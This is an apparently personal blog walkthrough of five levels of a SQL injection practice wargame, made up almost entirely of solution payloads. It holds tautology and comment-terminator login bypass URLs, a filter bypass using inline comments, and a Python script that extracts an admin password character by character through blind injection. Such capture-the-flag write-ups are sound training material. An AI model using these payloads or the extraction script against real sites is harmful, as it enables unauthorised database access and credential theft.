---
layout: default
---

# SQL Injection Exercise 
23-04-2019

Visit [los.eagle-jump.org](https://los.eagle-jump.org) to play along with me. There are multiple possible solutions to each challenge, so you must try them all.

## 1. Gremlin

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/sqli-images/gremlin_1.JPG)


```
https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=a'or 'a'='a&pw=a' or 'a'='a
```

## 2. Cobolt

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/sqli-images/cobolt_2.JPG)


```
https://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=a' or 'a'='a' limit 1,1 -- '&pw=
```

## 3. Goblin

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/sqli-images/goblin_3.JPG)


```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0 or 1=1 and no=2
```

## 4. orc

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/sqli-images/orc_4.JPG)

```py
import requests
import string

cookies = {'PHPSESSID':'<REDACTED>'}

length = 0
while True:
	length += 1
	passLenUrl = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=1' or (id='admin' and  length(pw)='" + str(length) + "') %23"
	r = requests.get(passLenUrl,cookies=cookies)
	response = r.text
	if(response.count("Hello") == 2):
		break
print("pw length = " + str(length) + "\n")

pw = ""
for i in range(1,length+1):
	j=""
	for j in string.printable:
		url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=1' or (id='admin' and substring(pw,"+str(i)+",1) = '"+str(j)+"') %23"
		r = requests.get(url,cookies=cookies)
		response = r.text
		if(response.count("Hello") == 2):
			break
	pw += j

print("pw = " + pw)
```

```
https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=295d5844
```

## 5. Wolfman

![Branching](https://raw.githubusercontent.com/r0hanSH/r0hanSH.github.io/master/images/sqli-images/wolfman_5.JPG)


```
https://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=1'/**/or/**/1=1/**/and/**/id='admin'%23
```